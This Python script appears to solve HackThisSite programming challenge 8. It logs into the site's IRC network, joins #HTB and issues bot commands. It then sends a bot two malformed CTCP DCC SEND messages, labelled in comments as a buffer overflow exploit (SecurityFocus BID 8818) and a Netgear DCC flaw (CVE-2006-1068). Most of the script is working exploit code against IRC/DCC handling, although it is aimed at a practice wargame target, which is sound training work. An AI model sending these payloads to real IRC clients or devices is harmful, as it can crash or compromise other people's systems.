from irc_bot import irc_bot
import time
import hashlib
import argparse

parser = argparse.ArgumentParser(description='Complete HackThisSite programming challenge 8. ')
parser.add_argument('--server', default="irc-hub.hackthissite.org", help="irc server to connect to. defaults to irc-hub.hackthissite.org")
parser.add_argument('--nick', help="Nickname to use on login", required=True)
parser.add_argument('--password', help="password for nick. Must have previously registered this nick and linked to HTS account (use an alternate client)", required=True)
args = parser.parse_args()

server = args.server
#server = "irc.5ci.net"
nick = args.nick
irc_password = args.password

irc = irc_bot(server, nick=nick, password=irc_password)

"""-------------------------------------------------------------------
main
------------------------------------------------------------------"""
irc.hold_for_response("NOTICE")
irc.message("nickserv", "identify " + irc_password)
irc.hold_for_response("recognized")
irc.send_command("JOIN #HTB")
irc.hold_for_response("End of /NAMES list")

irc.send_command("PRIVMSG #htb :!htb")
time.sleep(3)
irc.send_command("PRIVMSG #htb :!say !op unground")
time.sleep(3)
#buffer overflow attack http://www.securityfocus.com/bid/8818/exploit
irc.send_command('PRIVMSG moo :\001DCC SEND "a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a" 1344406250 34234 32234234')
time.sleep(3)
#netgear vulnerability CVE-2006-1068 - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1068
irc.send_command('PRIVMSG moo :\001DCC SEND "qweasdzxcqweasdzxc" 0 0 0')
while True:
    time.sleep(1)